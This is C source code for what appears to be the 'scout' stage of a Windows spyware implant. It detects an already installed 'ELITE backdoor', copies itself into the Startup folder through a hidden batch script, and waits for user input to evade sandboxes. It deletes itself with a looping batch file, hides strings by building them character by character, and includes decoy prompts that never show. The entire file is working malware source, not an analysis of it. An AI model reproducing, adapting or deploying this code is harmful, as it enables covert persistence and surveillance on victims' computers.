#include <Windows.h>
#include <stdio.h>
#include <Shlobj.h>
#include <Shlwapi.h>
#include <Sddl.h>

#include "main.h"
#include "md5.h"
#include "api.h"
#include "binpatched_vars.h"
#include "autodelete_batch.h"

#pragma comment(lib, "advapi32")
#pragma comment(lib, "ws2_32")
#pragma comment(lib, "winhttp")
#pragma comment(lib, "netapi32")
#pragma comment(lib, "gdiplus")
#pragma comment(lib, "shell32")
#pragma comment(lib, "shlwapi")

extern VOID SyncThreadFunction();
extern PWCHAR GetRandomString(ULONG uMin);
extern BYTE pServerKey[32];
extern BYTE pConfKey[32];
extern BYTE pSessionKey[20];
extern BYTE pLogKey[32];
extern BOOL bLastSync;

BOOL uMelted = FALSE;
PULONG uSynchro;
BOOL bLastSync = FALSE;
BOOL bSync = FALSE;
HANDLE hScoutSharedMemory;

//#pragma comment(linker, "/EXPORT:MyConf=?MyConf@@YAXXZ")
__declspec(dllexport) PWCHAR MyConf(PULONG pSynchro)
{
#ifdef _DEBUG
	OutputDebugString(L"[+] Setting uMelted to TRUE\n");
#endif
	uMelted = TRUE;
	uSynchro = pSynchro;

	//PWCHAR pScoutName = (PWCHAR)malloc(strlen(SCOUT_NAME)*sizeof(WCHAR) + 2*sizeof(WCHAR));
	PWCHAR pScoutName = (PWCHAR)VirtualAlloc(NULL, strlen(SCOUT_NAME)*sizeof(WCHAR) + 2*sizeof(WCHAR), MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
	//_snwprintf_s(pScoutName, strlen(SCOUT_NAME)+2, _TRUNCATE, L"%S", SCOUT_NAME);
	MultiByteToWideChar(CP_ACP, MB_PRECOMPOSED, SCOUT_NAME, strlen(SCOUT_NAME), pScoutName, strlen(SCOUT_NAME) + 2);

	return pScoutName;
}


int CALLBACK WinMain(HINSTANCE hInstance,
	HINSTANCE hPrevInstance,
	LPSTR lpCmdLine,
	int nCmdShow)
{
#ifdef _DEBUG_BINPATCH
	MessageBox(NULL, L"_DEBUG_BINPATCH", L"_DEBUG_BINPATCH", 0);
#endif
	if (GetCurrentProcessId() == 4)
	{
		MessageBox(NULL, L"I'm going to start the program", L"Warning", 0);
		return 0;
	}

	memcpy(pServerKey, CLIENT_KEY, 32);
	memcpy(pConfKey, ENCRYPTION_KEY_CONF, 32);
	memcpy(pLogKey, ENCRYPTION_KEY, 32);
#ifdef _DEBUG_BINPATCH
	MD5((PBYTE)CLIENT_KEY, 32, (PBYTE)pServerKey);
	MD5((PBYTE)ENCRYPTION_KEY_CONF, 32, (PBYTE)pConfKey);
	MD5((PBYTE)ENCRYPTION_KEY, 32, (PBYTE)pLogKey);
#endif

	// first check for elite presence
	if (ExistsEliteSharedMemory())
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] An ELITE backdoor is already installed here!\n");
#endif
		if (AmIFromStartup())
		{
			DeleteAndDie(FALSE);
		}
		if (uMelted)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		else
			return 0;
	}
	// check if I'm already running
	if (ExistsScoutSharedMemory())
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] Scout already active\n");
#endif
		if (uMelted)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		else
			return 0;
	}

	if (!CreateScoutSharedMemory())
	{
#ifdef _DEBUG
		OutputDebugString(L"[+] Cannot create shared memory\n");
#endif
		if (uMelted)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		else
			return 0;
	}

	MySleep(WAIT_DROP);	
	if (!uMelted)
		Drop();

	UseLess();
	WaitForInput();

	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)SyncThreadFunction, NULL, 0, NULL);
	WaitForSingleObject(hThread, INFINITE);

	if (hScoutSharedMemory)
	{
		CloseHandle(hScoutSharedMemory);
		hScoutSharedMemory = NULL;
	}
	
	if (uMelted)
	{
		*uSynchro = 1;
		ExitThread(0);
	}


	return 0;
}

VOID Drop()
{
	if (!AmIFromStartup())
	{
#ifdef _DEBUG
	OutputDebugString(L"[+] Dropping..\n");
#endif

		PWCHAR pSourcePath = GetMySelfName();
		PWCHAR pDestPath = GetStartupScoutName();
		
		if (GetCurrentProcessId() == 4)
			MessageBox(NULL, L"I'm going to start the program automatically, is it ok?", L"Warning", 1);

		DoCopyFile(pSourcePath, pDestPath);

		free(pSourcePath);
		free(pDestPath);
	}
}

VOID DoCopyFile(PWCHAR pSource, PWCHAR pDest)
{
	PWCHAR pBatchName;

	CreateCopyBatch(pSource, pDest, &pBatchName);
	StartBatch(pBatchName);
	MySleep(2000);
	DeleteFile(pBatchName);

	free(pBatchName);
}

VOID UseLess()
{
	if (GetCurrentProcessId() == 4) 
	{
		MessageBox(NULL, L"Click to start the program", L"Starting", 0);

		memset(DEMO_TAG, 0x0, 3);
		memset(WMARKER, 0x0, 3);
		memset(CLIENT_KEY, 0x0, 3);
		memset(ENCRYPTION_KEY_CONF, 0x0, 3);
		memset(SCOUT_NAME, 0x0, 3);
	}
}


VOID WaitForInput()
{
	ULONG uLastInput;
	LASTINPUTINFO pLastInputInfo;

#ifdef _DEBUG
	OutputDebugString(L"[+] FIRST_WAIT\n");
#endif
	MySleep(WAIT_INPUT);


	pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
	GetLastInputInfo(&pLastInputInfo);
	uLastInput = pLastInputInfo.dwTime;
	while (1)
	{
		pLastInputInfo.cbSize = sizeof(LASTINPUTINFO);
		if (GetLastInputInfo(&pLastInputInfo))
		{
			if (pLastInputInfo.dwTime != uLastInput)
				break;
		}
		else
		{
#ifdef _DEBUG
			OutputDebugString(L"[+] GetLastInput FAILED\n");
#endif
			MySleep(3000);
			break;
		}

#ifdef _DEBUG
		OutputDebugString(L"[+] Waiting for input...\n");
#endif
		MySleep(3000);
	}
}


VOID DeleteAndDie(BOOL bDie)
{
	HANDLE hFile;
	char batch_format[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };

	if (hScoutSharedMemory)
	{
		CloseHandle(hScoutSharedMemory);	
		hScoutSharedMemory = NULL;
	}

	if (uMelted) // from melted app
	{
		PWCHAR pFullPath = GetStartupScoutName();
		DeleteFile(pFullPath);
		free(pFullPath);

		if (bDie)
		{
			*uSynchro = 1;
			ExitThread(0);
		}
		return;
	}

	// not melted
	if (!AmIFromStartup())
	{ 
		PWCHAR pName = GetStartupScoutName();
		DeleteFile(pName);
		free(pName);

		if (bDie)
				ExitProcess(0);
		else
			return;
	}
	else // batch
	{
		PWCHAR pTempPath = GetTemp();
		PWCHAR pBatFileName = (PWCHAR)malloc(32767 * sizeof(WCHAR));

		ULONG uTick = GetTickCount();
		do
		{
			_snwprintf_s(pBatFileName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
			hFile = CreateFile(pBatFileName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hFile && hFile != INVALID_HANDLE_VALUE)
				break;
		}
		while(1);

#ifdef _DEBUG
		OutputDebugString(pBatFileName);
#endif

		// get full filename in startup
		PWCHAR pExeFileName = GetStartupScoutName();

		// create batch buffer
		ULONG uSize = strlen(batch_format) + 32676*3 + 1;
		LPSTR pBatchBuffer = (LPSTR)malloc(uSize);
		memset(pBatchBuffer, 0x0, uSize);
		_snprintf_s(pBatchBuffer, uSize, _TRUNCATE, batch_format, pExeFileName, pExeFileName, pBatFileName);

		// write it
		ULONG uOut;
		WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
		CloseHandle(hFile);

		if (StartBatch(pBatFileName))
		{
			if (bDie)
			{
				if (uMelted)
				{
					*uSynchro = 1;
					ExitThread(0);
				}
				else
					ExitProcess(0);
			}
			else
				return;
		}
#ifdef _DEBUG
		else
			OutputDebugString(L"[!!] Error executing autodelete batch!!\n");
#endif
		free(pBatFileName);
		free(pExeFileName);
		free(pBatchBuffer);
		free(pTempPath);
	}
}


PCHAR GetScoutSharedMemoryName()
{
	PCHAR pName = (PCHAR)malloc(16);
	memset(pName, 0x0, 16);

	_snprintf_s(pName, 
		16, 
		_TRUNCATE, 
		"%02X%02X%02X%02X%c%c", 
		pServerKey[3], pServerKey[2], pServerKey[1], pServerKey[0], 'B', 'R');

	return pName;
}

PCHAR GetEliteSharedMemoryName()
{
	PCHAR pName = (PCHAR)malloc(16);
	memset(pName, 0x0, 16);

	_snprintf_s(pName, 
		16, 
		_TRUNCATE, 
		"%c%c%c%02X%02X%02X%02X", 
		'F', 'S', 'B', pServerKey[0], pServerKey[1], pServerKey[2], pServerKey[3]);

	return pName;
}

BOOL CreateScoutSharedMemory()
{
	PCHAR pName;

#ifdef _DEBUG
	OutputDebugString(L"[+] Creating scout shared memory\n");
#endif
	if (ExistsScoutSharedMemory())
		return FALSE;

	pName = GetScoutSharedMemoryName();
	hScoutSharedMemory = CreateFileMappingA(INVALID_HANDLE_VALUE, 
		NULL,
		PAGE_READWRITE,
		0,
		SHARED_MEMORY_WRITE_SIZE,
		pName);
	free(pName);

	if (hScoutSharedMemory)
		return TRUE;

	return FALSE;
}

BOOL ExistsScoutSharedMemory()
{
	PCHAR pName;
	BOOL uRet = FALSE;

	pName = GetScoutSharedMemoryName();
	HANDLE hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);

	if (hMem)
	{
		uRet = TRUE;
		CloseHandle(hMem);
	}

	free(pName);
	return uRet;
}


BOOL ExistsEliteSharedMemory()
{
	PCHAR pName;
	BOOL uRet = FALSE;

	pName = GetEliteSharedMemoryName();

#ifdef _DEBUG
	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
	swprintf_s((wchar_t *)pDebugString, 1024, L"[+] Looking for SharedMemory %S\n", pName);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif

	HANDLE hMem = OpenFileMappingA(FILE_MAP_READ, FALSE, pName);
	if (hMem)
	{
		uRet = TRUE;
		CloseHandle(hMem);
	}
#ifdef _DEBUG
	else
	{
//		PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
//		swprintf_s(pDebugString, 1024, L"[+] OpenFileMappingA, hMem: %08x, LastError: %08x\n", hMem, GetLastError());//
//		OutputDebugString(pDebugString);
//		free(pDebugString);
	}
#endif

	free(pName);
	return uRet;
}


BOOL AmIFromStartup()
{
	BOOL uRet;
	PWCHAR pStartupPath = GetStartupPath();
	PWCHAR pCurrentPath = GetMySelfName();

	*(StrRChr(pCurrentPath, NULL, L'\\')) = 0;
	if (StrCmpI(pCurrentPath, pStartupPath))
		uRet = FALSE;
	else
		uRet = TRUE;
	
	free(pStartupPath);
	free(pCurrentPath);
	return uRet;
}

PWCHAR GetStartupPath()
{
	PWCHAR pStartupPath = (PWCHAR)malloc(32767*sizeof(WCHAR));
	PWCHAR pShortPath = (PWCHAR)malloc(32767*sizeof(WCHAR));

	SHGetSpecialFolderPath(NULL, pStartupPath, CSIDL_STARTUP, FALSE);
	GetShortPathName(pStartupPath, pShortPath, 4096);

	free(pStartupPath);
	return pShortPath;
}

PWCHAR GetStartupScoutName()
{
	PWCHAR pStartupPath = GetStartupPath();
	PWCHAR pFullPath = (PWCHAR)malloc(32767*sizeof(WCHAR));

	_snwprintf_s(pFullPath, 32767, _TRUNCATE, L"%s\\%S.exe", pStartupPath, SCOUT_NAME);
	free(pStartupPath);

	return pFullPath;
}


PWCHAR GetMySelfName()
{
	PWCHAR pName = (PWCHAR)malloc(32767 * sizeof(WCHAR));
	PWCHAR pShort = (PWCHAR)malloc(32767 * sizeof(WCHAR));

	GetModuleFileName(NULL, pName, 32766);
	GetShortPathName(pName, pShort, 32767);
	free(pName);

	return pShort;
}

PWCHAR GetTemp()
{
	PWCHAR pTemp = (PWCHAR)malloc(4096 * sizeof(WCHAR));
	PWCHAR pShort = (PWCHAR)malloc(4096 * sizeof(WCHAR));

	GetEnvironmentVariable(L"TMP", pTemp, 32767);
	GetShortPathName(pTemp, pShort, 4096);

	free(pTemp);
	return pShort;
}



VOID MySleep(ULONG uTime)
{
	//HANDLE hThread = GetCurrentThread();
	//WaitForSingleObject(hThread, uTime);
	Sleep(uTime);
}


BOOL StartBatch(PWCHAR pName)
{
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PWCHAR pApplicationName = (PWCHAR)malloc(4096 * sizeof(WCHAR));
	WCHAR pTempInterpreter[] = { L'%', L'S', L'Y', L'S', L'T', L'E', L'M', L'R', L'O', L'O', L'T', L'%', L'\\', L's', L'y', L's', L't', L'e', L'm', L'3', L'2', L'\\', L'c', L'm', L'd', L'.', L'e', L'x', L'e', 0x0 };
	PWCHAR pInterpreter = (PWCHAR) malloc(32767 * sizeof(WCHAR));

	ExpandEnvironmentStrings(pTempInterpreter, pInterpreter, 32767 * sizeof(WCHAR));
	_snwprintf_s(pApplicationName, 4095, _TRUNCATE, L"/c %s", pName);

	SecureZeroMemory(&si, sizeof(STARTUPINFO));
	SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_HIDE;
	
	BOOL bRet = CreateProcess(pInterpreter, pApplicationName, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

	free(pApplicationName);
	free(pInterpreter);
	return bRet;
}


VOID CreateDeleteBatch(PWCHAR pFileName, PWCHAR *pBatchOutName)
{
	HANDLE hFile;
	ULONG uTick, uOut;
	PWCHAR pTempPath = GetTemp();
	PWCHAR pBatchName = (PWCHAR) malloc(32767*sizeof(WCHAR));
	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', ':', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '"', '%', 'S', '"', '\r', '\n', 'i', 'f', ' ', 'e', 'x', 'i', 's', 't', ' ', '"', '%', 'S', '"', ' ', 'g', 'o', 't', 'o', ' ', 'd', '\r', '\n', 'd', 'e', 'l', ' ', '/', 'F', ' ', '"', '%', 'S', '"', 0x0 };
	PCHAR pBatchBuffer = (PCHAR) malloc(strlen(pBatchFormat) + (32767 * 3));
	
	uTick = GetTickCount();
	do
	{
		_snwprintf_s(pBatchName, 32766, _TRUNCATE, L"%s\\%d.bat", pTempPath, uTick++);
		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while (1);

	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, pFileName, pFileName, pBatchName); 
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

	*pBatchOutName = pBatchName;

	free(pBatchBuffer);
	free(pTempPath);
}


VOID CreateCopyBatch(PWCHAR pSource, PWCHAR pDest, PWCHAR *pBatchOutName)
{
	HANDLE hFile;
	ULONG uTick ,uOut;
	PWCHAR pTempPath = GetTemp();
	PWCHAR pBatchName = (PWCHAR)malloc(32767*sizeof(WCHAR));
	CHAR pBatchFormat[] = { '@', 'e', 'c', 'h', 'o', ' ', 'o', 'f', 'f', '\r', '\n', 't', 'y', 'p', 'e', ' ', '"', '%', 'S', '"', ' ', '>', '"', '%', 'S', '"', 0x0};
	PCHAR pBatchBuffer = (PCHAR)malloc(strlen(pBatchFormat) + (32767 * 3));

	uTick = GetTickCount();
	do
	{
		WCHAR pName[] = { L'%', L's', L'\\', L'%', L'd', L'.', L'b', L'a', L't', L'\0' };
		_snwprintf_s(pBatchName, 32766, _TRUNCATE, pName, pTempPath, uTick++);
		hFile = CreateFile(pBatchName, GENERIC_READ|GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile && hFile != INVALID_HANDLE_VALUE)
			break;
	}
	while (1);

	_snprintf_s(pBatchBuffer, strlen(pBatchFormat) + (32767 * 3), _TRUNCATE, pBatchFormat, pSource, pDest);
	WriteFile(hFile, pBatchBuffer, strlen(pBatchBuffer), &uOut, NULL);
	CloseHandle(hFile);

	*pBatchOutName = pBatchName;

	free(pBatchBuffer);
	free(pTempPath);
}